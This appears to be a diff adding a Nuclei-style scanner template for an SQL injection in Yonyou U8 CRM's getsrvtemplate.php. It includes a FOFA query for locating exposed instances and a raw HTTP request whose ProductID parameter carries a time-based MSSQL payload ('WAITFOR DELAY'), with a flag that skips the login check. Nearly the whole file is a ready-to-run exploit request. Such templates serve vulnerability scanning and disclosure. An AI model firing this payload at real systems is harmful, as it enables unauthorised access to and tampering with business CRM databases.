@@ -1,0 +1,31 @@
+id: poc-gryfsciptgmbg0d8
+info:
+  name: 用友U8 CRM getsrvtemplate.php 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gryfsciptgmbg0d8'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gryfsciptgmbg0d8
+    fofa: app="用友U8CRM"
+http:
+- raw:
+  - 'GET /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1&Action=fromsrvtpl&ProductID='';WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
